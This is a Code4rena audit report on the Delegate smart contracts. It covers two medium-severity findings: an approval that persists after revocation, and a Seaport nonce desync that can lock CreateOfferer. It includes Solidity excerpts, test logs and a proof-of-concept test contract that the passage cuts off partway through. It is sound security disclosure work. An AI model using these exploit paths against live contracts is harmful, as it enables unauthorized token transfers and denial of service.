---
sponsor: "Delegate"
slug: "2023-09-delegate"
date: "2023-11-15" 
title: "Delegate"
findings: "https://github.com/code-423n4/2023-09-delegate-findings/issues"
contest: 284
---

# Overview

## About C4

Code4rena (C4) is an open organization consisting of security researchers, auditors, developers, and individuals with domain expertise in smart contracts.

A C4 audit is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.

During the audit outlined in this document, C4 conducted an analysis of the Delegate smart contract system written in Solidity. The audit took place between September 5—September 11 2023.

## Wardens

17 Wardens contributed reports to the Delegate:

  1. [ladboy233](https://code4rena.com/@ladboy233)
  2. [d4r3d3v1l](https://code4rena.com/@d4r3d3v1l)
  3. [DadeKuma](https://code4rena.com/@DadeKuma)
  4. [pfapostol](https://code4rena.com/@pfapostol)
  5. [Sathish9098](https://code4rena.com/@Sathish9098)
  6. Baki ([Viraz](https://code4rena.com/@Viraz) and [supernova](https://code4rena.com/@supernova))
  7. [p0wd3r](https://code4rena.com/@p0wd3r)
  8. [m4ttm](https://code4rena.com/@m4ttm)
  9. [Banditx0x](https://code4rena.com/@Banditx0x)
  10. [gkrastenov](https://code4rena.com/@gkrastenov)
  11. [Fulum](https://code4rena.com/@Fulum)
  12. [sces60107](https://code4rena.com/@sces60107)
  13. [Brenzee](https://code4rena.com/@Brenzee)
  14. [kodyvim](https://code4rena.com/@kodyvim)
  15. [lsaudit](https://code4rena.com/@lsaudit)
  16. [lodelux](https://code4rena.com/@lodelux)

This audit was judged by [Alex the Entreprenerd](https://code4rena.com/@GalloDaSballo).

Final report assembled by [liveactionllama](https://twitter.com/liveactionllama).

# Summary

The C4 analysis yielded an aggregated total of 2 unique vulnerabilities. Of these vulnerabilities, 0 received a risk rating in the category of HIGH severity and 2 received a risk rating in the category of MEDIUM severity.

Additionally, C4 analysis included 10 reports detailing issues with a risk rating of LOW severity or non-critical. There were also 2 reports recommending gas optimizations.

All of the issues presented here are linked back to their original finding.

# Scope

The code under review can be found within the [C4 Delegate repository](https://github.com/code-423n4/2023-09-delegate), and is composed of 12 smart contracts written in the Solidity programming language and includes 1,824 lines of Solidity code.

In addition to the known issues identified by the project team, a Code4rena bot race was conducted at the start of the audit. The winning bot, **Hound** from warden DadeKuma, generated the [Automated Findings report](https://gist.github.com/code423n4/b2b64c6a8265f8a3a7f724f67b8e49f9) and all findings therein were classified as out of scope.

# Severity Criteria

C4 assesses the severity of disclosed vulnerabilities based on three primary risk categories: high, medium, and low/non-critical.

High-level considerations for vulnerabilities span the following key areas when conducting assessments:

- Malicious Input Handling
- Escalation of privileges
- Arithmetic
- Gas use

For more information regarding the severity criteria referenced throughout the submission review process, please refer to the documentation provided on [the C4 website](https://code4rena.com), specifically our section on [Severity Categorization](https://docs.code4rena.com/awarding/judging-criteria/severity-categorization).

# Medium Risk Findings (2)
## [[M-01] No way to revoke Approval in `DelegateToken.approve` leads to unauthorized calling of `DelegateToken.transferFrom`](https://github.com/code-423n4/2023-09-delegate-findings/issues/383)
*Submitted by [d4r3d3v1l](https://github.com/code-423n4/2023-09-delegate-findings/issues/383)*

<https://github.com/code-423n4/2023-09-delegate/blob/main/src/DelegateToken.sol#L134><br>
<https://github.com/code-423n4/2023-09-delegate/blob/main/src/DelegateToken.sol#L168><br>
<https://github.com/code-423n4/2023-09-delegate/blob/main/src/libraries/DelegateTokenStorageHelpers.sol#L149>

There is no way to revoke the approval which given via `DelegateToken.approve(address,delegateTokenId)`. They can able call the `DelegateToken.transferFrom` even the tokenHolder revoke the permission using the `DelegateToken.setApprovalForAll`.

If the spender address is approved by the PT token, we can call the `DelegateToken.withdraw`.

### Proof of Concept

Alice is the token Holder.

Alice approves Bob via `DelegateToken.setApprovalForAll(Bob,true)`.

Bob approves himself using `DelegateToken.approve(Bob,delegateTokenId)`

Alice revokes the Bob approval by calling `DelegateToken.setApprovalForAll(Bob,false);`

Now Bob can still calls the `DelegateToken.transferFrom(Alice,to,delegateTokenId)` which is subjected to call only by approved address.

The transfer will be successful.

**Code details**

<https://github.com/code-423n4/2023-09-delegate/blob/main/src/libraries/DelegateTokenStorageHelpers.sol#L143>

```solidity

function revertNotApprovedOrOperator(
        mapping(address account => mapping(address operator => bool enabled)) storage accountOperator,
        mapping(uint256 delegateTokenId => uint256[3] info) storage delegateTokenInfo,
        address account,
        uint256 delegateTokenId
    ) internal view {
        if (msg.sender == account || accountOperator[account][msg.sender] || msg.sender == readApproved(delegateTokenInfo, delegateTokenId)) return;
        revert Errors.NotApproved(msg.sender, delegateTokenId);
    }
```

Even after revoking the approval for operator using `setApprovalAll` this `msg.sender == readApproved(delegateTokenInfo, delegateTokenId)` will be true and able to call `transferFrom` function.

**Test function**

```solidity

function testFuzzingTransfer721(
        address from,
        address to,
        uint256 underlyingTokenId,
        bool expiryTypeRelative,
        uint256 time
    ) public {
        vm.assume(from != address(0));
        vm.assume(from != address(dt));

        (
            ,
            /* ExpiryType */
            uint256 expiry, /* ExpiryValue */

        ) = prepareValidExpiry(expiryTypeRelative, time);
        mockERC721.mint(address(from), 33);

        vm.startPrank(from);
        mockERC721.setApprovalForAll(address(dt), true);

        vm.stopPrank();
        vm.prank(from);
        dt.setApprovalForAll(address(dt), true);
        vm.prank(from);
        uint256 delegateId1 = dt.create(
            DelegateTokenStructs.DelegateInfo(
                from,
                IDelegateRegistry.DelegationType.ERC721,
                from,
                0,
                address(mockERC721),
                33,
                "",
                expiry
            ),
            SALT + 1
        );

        vm.prank(address(dt));
        dt.approve(address(dt), delegateId1);

        vm.prank(from);

        dt.setApprovalForAll(address(dt), false);
        address tmp = dt.getApproved(delegateId1);
        console.log(tmp);
        vm.prank(address(dt));
        dt.transferFrom(from, address(0x320), delegateId1);
    }
```

### Recommended Mitigation Steps

If token Holder revokes the approval for a operator using `DelegateToken.setApprovalForAll`, revoke the all the approvals(DelegateToken.approve) which is done by the operator.

### Assessed type

Access Control

**[0xfoobar (Delegate) confirmed and commented](https://github.com/code-423n4/2023-09-delegate-findings/issues/383#issuecomment-1728555248):**
 > Need to double-check, but looks plausible.

**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2023-09-delegate-findings/issues/383#issuecomment-1740661652):**
 > In contrast to ERC721, which only allows the owner to change `approve`<br>
> [ERC721.sol#L448-L454](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/ef3e7771a7e2d9b30234a57f96ee7acf5dddb9ed/contracts/token/ERC721/ERC721.sol#L448-L454)
> 
> `DT.approve` allows the operator to set themselves as approved, which can technically be undone via a multicall but may not be performed under normal usage.

**[Alex the Entreprenerd (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2023-09-delegate-findings/issues/383#issuecomment-1742167006):**
 > Leaning towards Medium Severity as the finding requires:
> - Alice `approvesForAll` Bob
> - Bob approves self
> - Alice revokes Bobs `approvalForAll`
> - Alice doesn't revoke the `_approve` that Bob gave to self
> 
> Notice that any transfer would reset the approval as well.

**[0xfoobar (Delegate) commented](https://github.com/code-423n4/2023-09-delegate-findings/issues/383#issuecomment-1745837556):**
 > A note about how ERC721 works: there are two different types of approvals. `approve()` lets an account move a single tokenId, while `setApprovalForAll()` marks an address as an operator to move all tokenIds. We can note the difference in the core OpenZeppelin ERC721 base contract, two separate mappings: https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC721/ERC721.sol#L32-L34
> 
> So plausible that an operator could be permitted to add new tokenid-specific approvals, but see your point that OZ ERC721 doesn't allow this by default and so could lead to confusing states that are possible but not fun to get out of.



***

## [[M-02] `CreateOfferer.sol` should not enforce the nonce incremented sequentially, otherwise user can DOS the contract by skipping order](https://github.com/code-423n4/2023-09-delegate-findings/issues/94)
*Submitted by [ladboy233](https://github.com/code-423n4/2023-09-delegate-findings/issues/94)*

According to https://github.com/ProjectOpenSea/seaport/blob/main/docs/SeaportDocumentation.md#contract-orders:

> "Seaport v1.2 introduced support for a new type of order: the contract order. In brief, a smart contract that implements the ContractOffererInterface (referred to as an “Seaport app contract” or 'Seaport app' in the docs and a 'contract offerer' in the code) can now provide a dynamically generated order (a contract order) in response to a buyer or seller’s contract order request."

The CreateOfferer.sol aims to be comply with the interface ContractOffererInterface.

The life cycle of the contract life cycle here is here:

<https://github.com/ProjectOpenSea/seaport/blob/main/docs/SeaportDocumentation.md#example-lifecycle-journey>

First the function `_getGeneratedOrder` is called.

Then after the order execution, the function ratifyOrder is triggered for contract (CreateOfferer.sol) to do post order validation.

In the logic of ratifyOrder, the nonce is incremented by calling this [line of code](https://github.com/code-423n4/2023-09-delegate/blob/a6dbac8068760ee4fc5bababb57e3fe79e5eeb2e/src/CreateOfferer.sol#L77) `Helpers.processNonce`.

```solidity
function ratifyOrder(SpentItem[] calldata offer, ReceivedItem[] calldata consideration, bytes calldata context, bytes32[] calldata, uint256 contractNonce)
	external
	checkStage(Enums.Stage.ratify, Enums.Stage.generate)
	onlySeaport(msg.sender)
	returns (bytes4)
{
	Helpers.processNonce(nonce, contractNonce);
	Helpers.verifyCreate(delegateToken, offer[0].identifier, transientState.receivers, consideration[0], context);
	return this.ratifyOrder.selector;
}
```

This is calling this [line of code](https://github.com/code-423n4/2023-09-delegate/blob/a6dbac8068760ee4fc5bababb57e3fe79e5eeb2e/src/libraries/CreateOffererLib.sol#L184).

```solidity
function processNonce(CreateOffererStructs.Nonce storage nonce, uint256 contractNonce) internal {
	if (nonce.value != contractNonce) revert CreateOffererErrors.InvalidContractNonce(nonce.value, contractNonce);
	unchecked {
		++nonce.value;
	} // Infeasible this will overflow if starting point is zero
}
```

The CreateOffererStructs.Nonce data structure is just [nonce](https://github.com/code-423n4/2023-09-delegate/blob/a6dbac8068760ee4fc5bababb57e3fe79e5eeb2e/src/libraries/CreateOffererLib.sol#L72).

```solidity
library CreateOffererStructs {
    /// @notice Used to track the stage and lock status
    struct Stage {
        CreateOffererEnums.Stage flag;
        CreateOffererEnums.Lock lock;
    }

    /// @notice Used to keep track of the seaport contract nonce of CreateOfferer
    struct Nonce {
        uint256 value;
    }
```

But this is not how Seaport contract track contract nonce.

On Seaport contract, we are calling [\_getGeneratedOrder](https://github.com/ProjectOpenSea/seaport/blob/539f0c18af85152aff9d64d90a55cf1627fd3e25/reference/lib/ReferenceOrderValidator.sol#L323).

Which calls [\_callGenerateOrder](https://github.com/ProjectOpenSea/seaport/blob/539f0c18af85152aff9d64d90a55cf1627fd3e25/reference/lib/ReferenceOrderValidator.sol#L360).

```solidity
{
	// Do a low-level call to get success status and any return data.
	(bool success, bytes memory returnData) = _callGenerateOrder(
		orderParameters,
		context,
		originalOfferItems,
		originalConsiderationItems
	);

	{
		// Increment contract nonce and use it to derive order hash.
		// Note: nonce will be incremented even for skipped orders, and
		// even if generateOrder's return data doesn't meet constraints.
		uint256 contractNonce = (
			_contractNonces[orderParameters.offerer]++
		);

		// Derive order hash from contract nonce and offerer address.
		orderHash = bytes32(
			contractNonce ^
				(uint256(uint160(orderParameters.offerer)) << 96)
		);
	}
```

As we can see:

```solidity
// Increment contract nonce and use it to derive order hash.
// Note: nonce will be incremented even for skipped orders, and
// even if generateOrder's return data doesn't meet constraints.
uint256 contractNonce = (
	_contractNonces[orderParameters.offerer]++
);
```

Nonce will be incremented even for skipped orders.

This is very important, suppose the low level call \_callGenerateOrder return false, we are hitting the [else block](https://github.com/ProjectOpenSea/seaport/blob/539f0c18af85152aff9d64d90a55cf1627fd3e25/reference/lib/ReferenceOrderValidator.sol#L401).

```solidity
 return _revertOrReturnEmpty(revertOnInvalid, orderHash);
```

This is calling `_revertOrReturnEmpty`.

```solidity
function _revertOrReturnEmpty(
	bool revertOnInvalid,
	bytes32 contractOrderHash
)
	internal
	pure
	returns (
		bytes32 orderHash,
		uint256 numerator,
		uint256 denominator,
		OrderToExecute memory emptyOrder
	)
{
	// If invalid input should not revert...
	if (!revertOnInvalid) {
		// Return the contract order hash and zero values for the numerator
		// and denominator.
		return (contractOrderHash, 0, 0, emptyOrder);
	}

	// Otherwise, revert.
	revert InvalidContractOrder(contractOrderHash);
}
```

Clearly we can see that if the flag revertOnInvalid is set to false, then even the low level call return false, the nonce of the offerer is still incremented.

Where in the Seaport code does it set revertOnInvalid to false?

When the Seaport wants to combine multiple orders in [this line of code](https://github.com/ProjectOpenSea/seaport-core/blob/d4e8c74adc472b311ab64b5c9f9757b5bba57a15/src/lib/OrderCombiner.sol#L137).

```solidity
    function _fulfillAvailableAdvancedOrders(
        AdvancedOrder[] memory advancedOrders,
        CriteriaResolver[] memory criteriaResolvers,
        FulfillmentComponent[][] memory offerFulfillments,
        FulfillmentComponent[][] memory considerationFulfillments,
        bytes32 fulfillerConduitKey,
        address recipient,
        uint256 maximumFulfilled
    ) internal returns (bool[] memory, /* availableOrders */ Execution[] memory /* executions */ ) {
        // Validate orders, apply amounts, & determine if they use conduits.
        (bytes32[] memory orderHashes, bool containsNonOpen) = _validateOrdersAndPrepareToFulfill(
            advancedOrders,
            criteriaResolvers,
            false, // Signifies that invalid orders should NOT revert.
            maximumFulfilled,
            recipient
        );
```

We [call](https://github.com/ProjectOpenSea/seaport-core/blob/d4e8c74adc472b311ab64b5c9f9757b5bba57a15/src/lib/OrderCombiner.sol#L256) `_validateOrderAndUpdateStatus`.

```solidity
// Validate it, update status, and determine fraction to fill.
(bytes32 orderHash, uint256 numerator, uint256 denominator) =
_validateOrderAndUpdateStatus(advancedOrder, revertOnInvalid);
```

Finally we [call](https://github.com/ProjectOpenSea/seaport-core/blob/d4e8c74adc472b311ab64b5c9f9757b5bba57a15/src/lib/OrderValidator.sol#L178C21-L178C37) the logic \_getGeneratedOrder(orderParameters, advancedOrder.extraData, revertOnInvalid) below with parameter revertOnInvalid false.

```solidity
  // If the order is a contract order, return the generated order.
	if (orderParameters.orderType == OrderType.CONTRACT) {
		// Ensure that the numerator and denominator are both equal to 1.
		assembly {
			// (1 ^ nd =/= 0) => (nd =/= 1) => (n =/= 1) || (d =/= 1)
			// It's important that the values are 120-bit masked before
			// multiplication is applied. Otherwise, the last implication
			// above is not correct (mod 2^256).
			invalidFraction := xor(mul(numerator, denominator), 1)
		}

		// Revert if the supplied numerator and denominator are not valid.
		if (invalidFraction) {
			_revertBadFraction();
		}

		// Return the generated order based on the order params and the
		// provided extra data. If revertOnInvalid is true, the function
		// will revert if the input is invalid.
		return _getGeneratedOrder(orderParameters, advancedOrder.extraData, revertOnInvalid);
	}
```

Ok what does this mean?

Suppose the CreateOfferer.sol fulfills two orders and creates two delegate tokens.

The nonces start from 0 and then increment to 1 and then increment to 2.

A user crafts a contract with malformed minimumReceived and combines with another valid order to call OrderCombine.

As we can see above, when multiple order is passed in, the revertOnInvalid is set to false, so the contract order from CreateOfferer.sol is skipped, but the nonce is incremented.

Then the nonce tracked by CreateOfferer.sol internally is out of sync with the contract nonce in seaport contract forever.

Then the CreateOfferer.sol is not usable because if the [ratifyOrder callback](https://github.com/ProjectOpenSea/seaport/blob/539f0c18af85152aff9d64d90a55cf1627fd3e25/reference/lib/ReferenceZoneInteraction.sol#L147) hit the contract, transaction revert [in this check](https://github.com/code-423n4/2023-09-delegate/blob/a6dbac8068760ee4fc5bababb57e3fe79e5eeb2e/src/libraries/CreateOffererLib.sol#L185).

```solidity
 if (nonce.value != contractNonce) revert CreateOffererErrors.InvalidContractNonce(nonce.value, contractNonce);
```

### Recommended Mitigation Steps

I would recommend do not validate the order execution in the ratifyOrder call back by using the contract nonce, instead, validate the order using [orderHash](https://github.com/ProjectOpenSea/seaport/blob/539f0c18af85152aff9d64d90a55cf1627fd3e25/reference/lib/ReferenceZoneInteraction.sol#L151).

```solidity
if (
ContractOffererInterface(offerer).ratifyOrder(
orderToExecute.spentItems,
orderToExecute.receivedItems,
advancedOrder.extraData,
orderHashes,
uint256(orderHash) ^ (uint256(uint160(offerer)) << 96)
) != ContractOffererInterface.ratifyOrder.selector
)
```

### Assessed type

DoS

**[0xfoobar (Delegate) confirmed and commented](https://github.com/code-423n4/2023-09-delegate-findings/issues/94#issuecomment-1728555434):**
 > Need to double-check but looks plausible.

**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2023-09-delegate-findings/issues/94#issuecomment-1742175246):**
 > `_callGenerateOrder` is caught, and in case of multiple order will be incrementing nonce without reverting.
> 
> [ReferenceOrderValidator.sol#L286-L302](https://github.com/ProjectOpenSea/seaport/blob/22ea29df3c241ebc17c95268164dde47e1186287/reference/lib/ReferenceOrderValidator.sol#L286-L302)
> 
> ```solidity
>     function _callGenerateOrder(
>         OrderParameters memory orderParameters,
>         bytes memory context,
>         SpentItem[] memory originalOfferItems,
>         SpentItem[] memory originalConsiderationItems
>     ) internal returns (bool success, bytes memory returnData) {
>         return
>             orderParameters.offerer.call(
>                 abi.encodeWithSelector(
>                     ContractOffererInterface.generateOrder.selector,
>                     msg.sender,
>                     originalOfferItems,
>                     originalConsiderationItems,
>                     context
>                 )
>             );
>     }
> ```
> 
> The call to `generateOrder` will revert at `processSpentItems`.
> 
> [CreateOffererLib.sol#L351-L352](https://github.com/code-423n4/2023-09-delegate/blob/a6dbac8068760ee4fc5bababb57e3fe79e5eeb2e/src/libraries/CreateOffererLib.sol#L351-L352)
> 
> ```solidity
>         if (!(minimumReceived.length == 1 && maximumSpent.length == 1)) revert CreateOffererErrors.NoBatchWrapping();
> 
> ```
> 
> This will cause the nonce to be increased in Seaport but not on the `CreateOfferer`.

**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2023-09-delegate-findings/issues/94#issuecomment-1742682777):**
 > Have asked the Warden for a Coded POC.<br>
> Have reached out to Seaport Devs to ask for advice as to whether the issue is valid.

**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2023-09-delegate-findings/issues/94#issuecomment-1745091145):**
 > [Coded POC](https://gist.github.com/JeffCX/2d91b4f5f781f08a249350e748d85131#file-createofferer-t-sol-L545) from the warden.

**[0xfoobar (Delegate) disagreed with severity and commented](https://github.com/code-423n4/2023-09-delegate-findings/issues/94#issuecomment-1745811557):**
 > Believe issue is valid, would love confirmation from Seaport devs if you have it. Believe this should be a quality Medium not High because CreateOfferer is tangential to the core protocol, would not cause any loss of user funds if abused, and could be easily replaced if DoS-ed. Appreciate the detailed work to dive into the workings of Seaport nonces.

**[Alex the Entreprenerd (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2023-09-delegate-findings/issues/94#issuecomment-1748635567):**
 > Agree with impact from Sponsor. Temporarly marking as valid; however, we will not confirm until runnable POC is produced.

**[ladboy233 (warden) commented](https://github.com/code-423n4/2023-09-delegate-findings/issues/94#issuecomment-1748951894):**
 > Agree with sponsor's severity assessment!
> 
> Fully runnable [POC](https://gist.github.com/JeffCX/1ac6d24c79b4b680e5f2f24298135f7a) to show the nonce is out of sync.
>
> The Contract offerer internal nonce is tracked in this [line of code](https://gist.github.com/JeffCX/1ac6d24c79b4b680e5f2f24298135f7a#file-poc-sol-L62).
> 
> While the contract offerer nonce on Seaport side can be acquired by calling:
> 
> ```solidity
> seaport.getContractOffererNonce(address(contractOfferer1));
> ```
> 
> And indeed if we use `fulfillAvailableAdvancedOrder` to fulfill only one contract order and revert in other order, nonce is still incremented.
> 
> ```solidity
>      uint256 seaport_contrat_offer_1_nonce = seaport.getContractOffererNonce(address(contractOfferer1));
>         console2.log(seaport_contrat_offer_1_nonce); // the nonce of contract offerer on seaport is 1 is 1!!
>         uint256 oldNonce = contractOfferer1.nonce(); // the none of contract offerer 1 is 0!
>         console2.log(oldNonce);
> ```
> 
> A more detailed explanation is [here](https://gist.github.com/JeffCX/0d58dacfddaae87a74eb59ab07ebaca8).

**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2023-09-delegate-findings/issues/94#issuecomment-1750142313):**
 > Logs
> ```solidity
> Logs:
>   mockERC721.ownerOf(1) 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496
>   mockERC721.ownerOf(2) 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496
>   setRevert true
>   mockERC721.ownerOf(1) 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496
>   mockERC721.ownerOf(2) 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496
>   generateOrder
>   reverting
>   generateOrder
>   Sent ETH to SEAPORT true
>   fulfilled true
>   1
>   0
>   mockERC721.ownerOf(1) 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496
>   mockERC721.ownerOf(2) 0xa0Cb889707d426A7A386870A03bc70d1b0697598
> ```
> 
> As shown by the logs, the Token 1 is not transfered, but the nonce is consumed.
>
> <details>
> <summary>POC</summary>
> 
> ```solidity
> // SPDX-License-Identifier: CC0-1.0
> pragma solidity ^0.8.21;
> 
> import {Test} from "forge-std/Test.sol";
> import {BaseSeaportTest} from "./base/BaseSeaportTest.t.sol";
> import {BaseLiquidDelegateTest} from "./base/BaseLiquidDelegateTest.t.sol";
> import {SeaportHelpers, User} from "./utils/SeaportHelpers.t.sol";
> import {IDelegateToken, Structs as IDelegateTokenStructs} from "src/interfaces/IDelegateToken.sol";
> import {IDelegateRegistry} from "delegate-registry/src/IDelegateRegistry.sol";
> import {AdvancedOrder, OrderParameters, Fulfillment, CriteriaResolver, OfferItem, ConsiderationItem, FulfillmentComponent} from "seaport/contracts/lib/ConsiderationStructs.sol";
> import {ItemType, OrderType} from "seaport/contracts/lib/ConsiderationEnums.sol";
> import {SpentItem} from "seaport/contracts/interfaces/ContractOffererInterface.sol";
> 
> import {CreateOfferer, Enums as OffererEnums, Structs as OffererStructs} from "src/CreateOfferer.sol";
> import {MockERC721} from "./mock/MockTokens.t.sol";
> import {WETH} from "./mock/WETH.t.sol";
> 
> import {console2} from "forge-std/console2.sol";
> 
> import {IERC721} from "openzeppelin/token/ERC721/IERC721.sol";
> 
> import {IERC1155} from "openzeppelin/token/ERC1155/IERC1155.sol";
> 
> import {ItemType} from "seaport/contracts/lib/ConsiderationEnums.sol";
> 
> import {ContractOffererInterface, SpentItem, ReceivedItem, Schema} from "seaport/contracts/interfaces/ContractOffererInterface.sol";
> 
> interface ISeaport {
>     function getContractOffererNonce(address contractOfferer) external view returns (uint256 nonce);
> }
> 
> abstract contract ERC165 {
>     /**
>      * @dev See {IERC165-supportsInterface}.
>      */
>     function supportsInterface(bytes4 interfaceId) public view returns (bool) {
>         return interfaceId == bytes4(keccak256("supportsInterface(bytes4)"));
>     }
> }
> 
> /**
>  * @title TestContractOffererNativeToken
>  */
> contract TestContractOffererNativeToken is ContractOffererInterface, ERC165 {
>     error OrderUnavailable();
> 
>     address private immutable _SEAPORT;
> 
>     SpentItem private _available;
>     SpentItem private _required;
> 
>     bool public ready;
>     bool public fulfilled;
> 
>     uint256 public extraAvailable;
>     uint256 public extraRequired;
> 
>     bool reverting = false;
>     uint256 public nonce = 0;
>     address public otherContract;
> 
>     string public name;
> 
>     event ShowName(string name);
> 
>     event NumberUpdated(uint256 number);
> 
>     constructor(address seaport, string memory _name) {
>         // Set immutable values and storage variables.
>         _SEAPORT = seaport;
>         fulfilled = false;
>         ready = false;
>         extraAvailable = 0;
>         extraRequired = 0;
>         name = _name;
>     }
> 
>     function setRevert(bool state) public {
>         console2.log("setRevert", state);
>         reverting = state;
>     }
> 
>     receive() external payable {}
> 
>     function activate(SpentItem memory available, SpentItem memory required) public payable {
>         if (ready || fulfilled) {
>             revert OrderUnavailable();
>         }
> 
>         // Set storage variables.
>         _available = available;
>         _required = required;
>         ready = true;
>     }
> 
>     /// In case of criteria based orders and non-wildcard items, the member
>     /// `available.identifier` would correspond to the `identifierOrCriteria`
>     /// i.e., the merkle-root.
>     /// @param identifier corresponds to the actual token-id that gets transferred.
>     function activateWithCriteria(SpentItem memory available, SpentItem memory required, uint256 identifier) public {
>         if (ready || fulfilled) {
>             revert OrderUnavailable();
>         }
> 
>         if (available.itemType == ItemType.ERC721_WITH_CRITERIA) {
>             IERC721 token = IERC721(available.token);
> 
>             token.transferFrom(msg.sender, address(this), identifier);
> 
>             token.setApprovalForAll(_SEAPORT, true);
>         } else if (available.itemType == ItemType.ERC1155_WITH_CRITERIA) {
>             IERC1155 token = IERC1155(available.token);
> 
>             token.safeTransferFrom(msg.sender, address(this), identifier, available.amount, "");
> 
>             token.setApprovalForAll(_SEAPORT, true);
>         }
> 
>         // Set storage variables.
>         _available = available;
>         _required = required;
>         ready = true;
>     }
> 
>     function extendAvailable() public {
>         if (!ready || fulfilled) {
>             revert OrderUnavailable();
>         }
> 
>         extraAvailable++;
> 
>         _available.amount /= 2;
>     }
> 
>     function extendRequired() public {
>         if (!ready || fulfilled) {
>             revert OrderUnavailable();
>         }
> 
>         extraRequired++;
>     }
> 
>     function generateOrder(address, SpentItem[] calldata minimumReceived, SpentItem[] calldata maximumSpent, bytes calldata /* context */ )
>         external
>         returns (SpentItem[] memory offer, ReceivedItem[] memory consideration)
>     {
>         console2.log("generateOrder");
>         emit ShowName(name);
>         // Set the offer and consideration that were supplied during deployment.
>         if (reverting) {
>             console2.log("reverting");
>             revert("revert here");
>         }
> 
>         if (otherContract != address(0)) {
>             uint256 result = ISeaport(_SEAPORT).getContractOffererNonce(otherContract);
>             console2.log("result", result);
>             emit NumberUpdated(result);
>             uint256 oldNonce = TestContractOffererNativeToken(payable(otherContract)).nonce();
>             emit NumberUpdated(oldNonce);
>         }
> 
>         offer = new SpentItem[](1);
>         consideration = new ReceivedItem[](1);
> 
>         // Send eth to Seaport.
>         (bool success,) = _SEAPORT.call{value: minimumReceived[0].amount}("");
>         console2.log("Sent ETH to SEAPORT", success);
> 
>         // revert("error");
> 
>         // Revert if transaction fails.
>         if (!success) {
>             assembly {
>                 returndatacopy(0, 0, returndatasize())
>                 revert(0, returndatasize())
>             }
>         }
> 
>         // Set the offer item as the _available item in storage.
>         offer[0] = minimumReceived[0];
> 
>         // Set the erc721 consideration item.
>         consideration[0] = ReceivedItem({
>             itemType: ItemType.ERC721,
>             token: maximumSpent[0].token,
>             identifier: maximumSpent[0].identifier,
>             amount: maximumSpent[0].amount,
>             recipient: payable(address(this))
>         });
> 
>         // Update storage to reflect that the order has been fulfilled.
>         fulfilled = true;
>         console2.log("fulfilled", fulfilled);
>     }
> 
>     function previewOrder(address caller, address, SpentItem[] calldata, SpentItem[] calldata, bytes calldata context)
>         external
>         view
>         returns (SpentItem[] memory offer, ReceivedItem[] memory consideration)
>     {
>         // Ensure the caller is Seaport & the order has not yet been fulfilled.
>         if (!ready || fulfilled || caller != _SEAPORT || context.length != 0) {
>             revert OrderUnavailable();
>         }
> 
>         // Set the offer and consideration that were supplied during deployment.
>         offer = new SpentItem[](1 + extraAvailable);
>         consideration = new ReceivedItem[](1 + extraRequired);
> 
>         for (uint256 i = 0; i < 1 + extraAvailable; ++i) {
>             offer[i] = _available;
>         }
> 
>         for (uint256 i = 0; i < 1 + extraRequired; ++i) {
>             consideration[i] =
>                 ReceivedItem({itemType: _required.itemType, token: _required.token, identifier: _required.identifier, amount: _required.amount, recipient: payable(address(this))});
>         }
>     }
> 
>     function getInventory() external view returns (SpentItem[] memory offerable, SpentItem[] memory receivable) {
>         // Set offerable and receivable supplied at deployment if unfulfilled.
>         if (!ready || fulfilled) {
>             offerable = new SpentItem[](0);
> 
>             receivable = new SpentItem[](0);
>         } else {
>             offerable = new SpentItem[](1 + extraAvailable);
>             for (uint256 i = 0; i < 1 + extraAvailable; ++i) {
>                 offerable[i] = _available;
>             }
> 
>             receivable = new SpentItem[](1 + extraRequired);
>             for (uint256 i = 0; i < 1 + extraRequired; ++i) {
>                 receivable[i] = _required;
>             }
>         }
>     }
> 
>     function ratifyOrder(
>         SpentItem[] calldata, /* offer */
>         ReceivedItem[] calldata, /* consideration */
>         bytes calldata, /* context */
>         bytes32[] calldata, /* orderHashes */
>         uint256 /* contractNonce */
>     ) external pure returns (bytes4 /* ratifyOrderMagicValue */ ) {
>         return ContractOffererInterface.ratifyOrder.selector;
>     }
> 
>     function onERC1155Received(address, address, uint256, uint256, bytes calldata) external pure returns (bytes4) {
>         return bytes4(0xf23a6e61);
>     }
> 
>     // function supportsInterface(
>     //     bytes4 interfaceId
>     // )
>     //     public
>     //     view
>     //     virtual
>     //     override(ERC165, ContractOffererInterface)
>     //     returns (bool)
>     // {
>     //     return
>     //         interfaceId == type(ContractOffererInterface).interfaceId ||
>     //         super.supportsInterface(interfaceId);
>     // }
> 
>     /**
>      * @dev Returns the metadata for this contract offerer.
>      */
>     function getSeaportMetadata()
>         external
>         pure
>         override
>         returns (
>             string memory name,
>             Schema[] memory schemas // map to Seaport Improvement Proposal IDs
>         )
>     {
>         schemas = new Schema[](1);
>         schemas[0].id = 1337;
>         schemas[0].metadata = new bytes(0);
> 
>         return ("TestContractOffererNativeToken", schemas);
>     }
> }
> 
> contract CreateOffererTest is Test, BaseSeaportTest, BaseLiquidDelegateTest, SeaportHelpers {
>     CreateOfferer createOfferer;
>     WETH weth;
>     uint256 startGas;
>     User buyer;
>     User seller;
> 
>     OfferItem offerItem;
>     ConsiderationItem considerationItem;
>     OfferItem[] offerItems;
>     ConsiderationItem[] considerationItems;
>     SpentItem[] minimumReceived;
>     SpentItem[] maximumSpent;
> 
>     function setUp() public {
>         OffererStructs.Parameters memory createOffererParameters =
>             OffererStructs.Parameters({seaport: address(seaport), delegateToken: address(dt), principalToken: address(principal)});
>         createOfferer = new CreateOfferer(createOffererParameters);
>         weth = new WETH();
>         // Setup buyer and seller
>         seller = makeUser("seller");
>         vm.label(seller.addr, "seller");
>         buyer = makeUser("buyer");
>         vm.label(buyer.addr, "buyer");
>     }
> 
>     function addOfferItem(OfferItem memory _offerItem) internal {
>         offerItems.push(_offerItem);
>     }
> 
>     ///@dev reset the offer items array
>     function resetOfferItems() internal {
>         delete offerItems;
>     }
> 
